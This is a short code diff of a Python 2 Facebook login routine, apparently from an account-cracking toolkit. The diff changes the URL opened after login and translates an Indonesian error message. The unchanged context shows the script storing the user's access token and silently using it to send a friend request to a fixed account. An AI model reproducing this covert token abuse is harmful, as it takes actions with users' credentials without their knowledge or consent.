@@ -264,11 +264,11 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				jalan( '\n\x1b[1;95mLogin Successful...') 
-				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				os.system('xdg-open https://www.facebook.com/YAYAN.XING.ZUCKERBERG.SR')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mTidak Ada Koneksi Inernet"
+				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
 			print("\n\x1b[1;97mSepertinya Akun Anda Checkpoint")
